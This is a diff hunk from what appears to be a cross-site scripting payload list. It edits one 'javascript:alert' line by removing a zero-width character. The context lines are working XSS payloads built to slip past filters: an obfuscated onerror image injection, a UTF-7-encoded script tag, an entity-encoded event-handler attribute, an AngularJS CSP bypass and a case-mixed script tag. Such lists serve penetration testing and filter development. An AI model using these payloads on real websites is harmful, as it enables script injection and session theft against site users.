@@ -178,7 +178,7 @@ javascript:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw o
 "><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
 top[8680439..toString(30)](document.domain)
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
-javascript​:alert’1’
+javascript:alert’1’
 %27%26%2362%20Oncontentvisibilityautostatechange=%27top%26sol;%26ast;%26ast;%26sol;%26quest;%26period;[%26quot;al%26quot;+%26quot;er%26quot;+([%26quot;t%26quot;][0])](1)%27style=%27content-visibility%26colon;auto
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp><button ng-click="$event.target.ownerDocument.defaultView.alert(document.domain)">Click me</button></div>
 <​ScRipT 5-0*3+9/3=>prompt(1)<​/ScRipT giveanswerhere=?
